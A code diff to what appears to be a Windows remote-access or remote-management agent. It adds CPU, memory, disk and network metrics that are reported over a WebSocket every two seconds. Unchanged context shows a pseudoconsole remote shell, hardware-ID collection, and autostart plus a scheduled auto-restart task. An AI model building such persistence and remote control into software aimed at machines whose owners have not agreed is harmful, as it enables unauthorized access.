@@ -1,5 +1,11 @@
-﻿#define WIN32_LEAN_AND_MEAN
+﻿// Target Windows 10 or later (Required for PseudoConsole/ConPTY)
+#define _WIN32_WINNT 0x0A00
+#define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#include <netioapi.h>
 #include <windows.h>
 #include <winhttp.h>
 #include <taskschd.h>
@@ -11,11 +17,16 @@
 #include <mutex>
 #include <atomic>
 #include <memory>
+#include <memory>
 #include <shlobj.h>
 #include <lmcons.h>
 #include <gdiplus.h>
 #include <vector>
 #include <algorithm>
+#include <pdh.h>
+#include <pdhmsg.h>
+#include <pdh.h>
+#include <pdhmsg.h>
 #include "json.hpp"
 
 using namespace Gdiplus;
@@ -26,6 +37,8 @@ using json = nlohmann::json;
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsupp.lib")
 #pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "pdh.lib")
+#pragma comment(lib, "iphlpapi.lib")
 
 
 namespace Config {
@@ -79,8 +92,16 @@ struct AppState {
     std::mutex wsMutex;
     int reconnectAttempts = 0;
     DWORD lastPingTime = 0;
+    DWORD lastMetricsTime = 0;
     ULONG_PTR gdiplusToken;
 } g_state;
+
+// Metrics Globals
+PDH_HQUERY cpuQuery;
+PDH_HCOUNTER cpuTotal;
+unsigned long long lastNetUp = 0;
+unsigned long long lastNetDown = 0;
+DWORD lastNetCheck = 0;
 
 typedef HRESULT(WINAPI* PFN_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, HPCON*);
 typedef void(WINAPI* PFN_ClosePseudoConsole)(HPCON);
@@ -105,6 +126,73 @@ bool LoadConPTYAPI() {
     g_ResizePseudoConsole = (PFN_ResizePseudoConsole)GetProcAddress(hKernel, "ResizePseudoConsole");
 
     return (g_CreatePseudoConsole && g_ClosePseudoConsole && g_ResizePseudoConsole);
+}
+
+void InitMetrics() {
+    PdhOpenQuery(NULL, NULL, &cpuQuery);
+    PdhAddEnglishCounter(cpuQuery, L"\\Processor(_Total)\\% Processor Time", NULL, &cpuTotal);
+    PdhCollectQueryData(cpuQuery);
+}
+
+double GetCpuUsage() {
+    PDH_FMT_COUNTERVALUE counterVal;
+    PdhCollectQueryData(cpuQuery);
+    PdhGetFormattedCounterValue(cpuTotal, PDH_FMT_DOUBLE, NULL, &counterVal);
+    return counterVal.doubleValue;
+}
+
+int GetRamUsage() {
+    MEMORYSTATUSEX memInfo;
+    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+    GlobalMemoryStatusEx(&memInfo);
+    return memInfo.dwMemoryLoad; // % usage
+}
+
+int GetDiskUsage() {
+    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
+    if (GetDiskFreeSpaceEx(L"C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
+        double total = (double)totalNumberOfBytes.QuadPart;
+        double free = (double)totalNumberOfFreeBytes.QuadPart;
+        return (int)((1.0 - (free / total)) * 100.0);
+    }
+    return 0;
+}
+
+struct NetStats {
+    double upKBps;
+    double downKBps;
+};
+
+NetStats GetNetworkUsage() {
+    MIB_IF_TABLE2* table;
+    if (GetIfTable2(&table) != NO_ERROR) return { 0, 0 };
+
+    unsigned long long totalTx = 0;
+    unsigned long long totalRx = 0;
+
+    for (int i = 0; i < table->NumEntries; i++) {
+        totalTx += table->Table[i].OutOctets;
+        totalRx += table->Table[i].InOctets;
+    }
+    FreeMibTable(table);
+
+    DWORD now = GetTickCount();
+    double timeDiff = (now - lastNetCheck) / 1000.0;
+    if (timeDiff < 0.1) return { 0, 0 }; // Too fast
+
+    double upSpeed = 0;
+    double downSpeed = 0;
+
+    if (lastNetCheck != 0) {
+        upSpeed = (totalTx - lastNetUp) / timeDiff / 1024.0; // KB/s
+        downSpeed = (totalRx - lastNetDown) / timeDiff / 1024.0; // KB/s
+    }
+
+    lastNetUp = totalTx;
+    lastNetDown = totalRx;
+    lastNetCheck = now;
+
+    return { upSpeed, downSpeed };
 }
 
 // Get HWID using WMIC
@@ -730,6 +818,29 @@ void KeepAliveThread() {
         }
         
         Sleep(1000);  // Check every second
+
+        // Send metrics every 2 seconds
+        if (currentTime - g_state.lastMetricsTime >= 2000) {
+            NetStats net = GetNetworkUsage();
+            json metrics;
+            metrics["type"] = "metrics";
+            metrics["data"] = {
+                {"cpu", GetCpuUsage()},
+                {"ram", GetRamUsage()},
+                {"disk", GetDiskUsage()},
+                {"netUp", net.upKBps},
+                {"netDown", net.downKBps}
+            };
+            
+             std::lock_guard<std::mutex> lock(g_state.wsMutex);
+             if (g_state.hWebSocket && g_state.wsConnected) {
+                std::string msgStr = metrics.dump();
+                WinHttpWebSocketSend(g_state.hWebSocket,
+                    WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
+                    (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
+             }
+             g_state.lastMetricsTime = currentTime;
+        }
     }
     
     printf("Keep-alive thread stopped\n");
@@ -950,6 +1061,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine,
     // Initialize GDI+
     GdiplusStartupInput gdiplusStartupInput;
     GdiplusStartup(&g_state.gdiplusToken, &gdiplusStartupInput, NULL);
+
+    InitMetrics();
 
     SetAutoStart(exePath);
     CreateAutoRestartTask(exePath);
